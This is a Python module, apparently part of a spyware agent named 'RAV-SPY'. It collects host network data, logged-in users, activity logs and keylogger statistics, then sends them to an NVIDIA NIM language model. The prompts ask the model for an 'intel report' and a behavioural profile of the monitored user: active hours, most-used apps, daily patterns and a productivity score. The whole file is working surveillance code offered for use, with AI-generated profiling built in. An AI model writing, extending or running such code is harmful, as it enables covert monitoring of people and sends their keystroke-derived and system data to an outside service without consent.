"""
AI Recon — comprehensive intelligence analysis using NVIDIA NIM.
Analyzes system data, network info, user behavior, and activity logs.
"""
import os
import json
import asyncio
import httpx
from loguru import logger


async def _call_nim(prompt: str) -> str:
    api_key = os.environ.get("NVIDIA_NIM_API_KEY", "")
    base_url = os.environ.get("NVIDIA_NIM_BASE_URL", "https://integrate.api.nvidia.com/v1")
    model = os.environ.get("NVIDIA_NIM_MODEL", "meta/llama-3.1-70b-instruct")

    if not api_key:
        return "AI tidak dikonfigurasi (NVIDIA_NIM_API_KEY)."

    try:
        async with httpx.AsyncClient(timeout=120) as client:
            resp = await client.post(
                f"{base_url}/chat/completions",
                headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
                json={
                    "model": model,
                    "messages": [{"role": "user", "content": prompt}],
                    "max_tokens": 2048,
                    "temperature": 0.3,
                },
            )
            resp.raise_for_status()
            return resp.json()["choices"][0]["message"]["content"].strip()
    except Exception as e:
        logger.error(f"AI Recon error: {e}")
        return f"Error: {e}"


async def full() -> str:
    context = []
    try:
        from agent.network_recon import arp_table, active_ports, dns_info
        context.append(await asyncio.to_thread(arp_table))
        context.append(await asyncio.to_thread(active_ports))
        context.append(await asyncio.to_thread(dns_info))
    except Exception:
        pass

    try:
        import psutil
        from datetime import datetime
        boot = datetime.fromtimestamp(psutil.boot_time())
        context.append(f"System uptime: {datetime.now() - boot}")
        context.append(f"CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}% | Disk: {psutil.disk_usage('/').percent}%")
        users = [u.name for u in psutil.users()]
        context.append(f"Active users: {', '.join(users)}")
    except Exception:
        pass

    prompt = f"""Kamu adalah analis intelijen untuk RAV-SPY.
Buat laporan komprehensif dari data berikut:

{'—' * 40}
{chr(10).join(context)}
{'—' * 40}

Format:
🎯 INTEL REPORT
📡 Network: [summary of network findings]
💻 System: [system analysis]
👤 Users: [user activity insights]
⚠️ Anomalies: [anything unusual]
💡 Recommendations: [actionable intel]
"""
    return await _call_nim(prompt)


async def user_behavior() -> str:
    context = []
    try:
        from agent.activity_log import get_recent_activity
        context.append(await asyncio.to_thread(get_recent_activity))
    except Exception:
        pass

    try:
        from agent.keylogger import stats
        context.append(await asyncio.to_thread(stats))
    except Exception:
        pass

    prompt = f"""Analisis pola pengguna dari data berikut:

{'—' * 40}
{chr(10).join(context)}
{'—' * 40}

Beri output:
👤 USER BEHAVIOR ANALYSIS
⏰ Active hours:
📱 Most used apps:
🔄 Daily patterns:
📊 Productivity score:
"""
    return await _call_nim(prompt)
